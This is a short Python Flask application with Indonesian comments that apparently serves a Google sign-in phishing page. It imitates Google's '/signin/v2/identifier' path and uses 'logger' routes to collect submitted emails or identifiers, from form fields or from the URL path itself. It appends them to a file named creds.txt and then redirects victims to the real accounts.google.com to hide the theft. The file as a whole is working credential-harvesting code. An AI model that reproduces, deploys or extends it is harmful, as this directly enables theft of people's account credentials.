from flask import Flask, request, render_template, redirect, url_for
from urllib.parse import unquote

app = Flask(__name__)

@app.route("/")
def page1():
    # Tampilkan halaman form untuk input emailid
    return render_template("page1.html")

@app.route("/signin/v2/identifier")
def page2():
    # Halaman kedua
    return render_template("page2.html")

@app.route("/logger/<int:func>", methods=["GET", "POST"])
def logger(func):
    if request.method == "POST":
        data = request.form.get("emailid")
        if data:
            with open("creds.txt", "a") as f:
                f.write(data + "\n")

        if func == 1:
            # Redirect ke halaman kedua menggunakan url_for supaya path dinamis
            return redirect(url_for("page2"))
        elif func == 2:
            # Redirect ke Google langsung
            return redirect("https://accounts.google.com")

    return "Invalid request", 400

@app.route("/logger/<path:data>/<int:func>", methods=["GET", "POST"])
def logger1(data, func):
    data = unquote(data)
    if data:
        with open("creds.txt", "a") as f:
            f.write(data + "\n")

    if func == 1:
        return redirect(url_for("page2"))
    elif func == 2:
        return redirect("https://accounts.google.com")

    return "Invalid request", 400


if __name__ == "__main__":
    app.run(debug=True)
